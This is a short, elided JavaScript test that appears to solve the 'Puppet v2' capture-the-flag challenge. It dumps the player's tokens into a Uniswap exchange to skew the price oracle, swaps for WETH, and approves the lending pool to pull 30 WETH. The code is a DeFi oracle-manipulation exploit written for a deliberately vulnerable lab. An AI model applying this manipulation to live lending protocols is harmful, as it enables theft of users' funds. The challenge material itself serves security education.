...
describe("[Challenge] Puppet v2", function () {
  ...
  it("Execution", async function () {
    ...
    const ETHER = ethers.utils.parseEther("9.9");
    ...
    await token
      .connect(player)
      .transfer(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE);
    await uniswapExchange.connect(player).swap(0, ETHER, player.address, []);
    ...
    await weth
      .connect(player)
      .approve(lendingPool.address, ethers.utils.parseEther("30"));
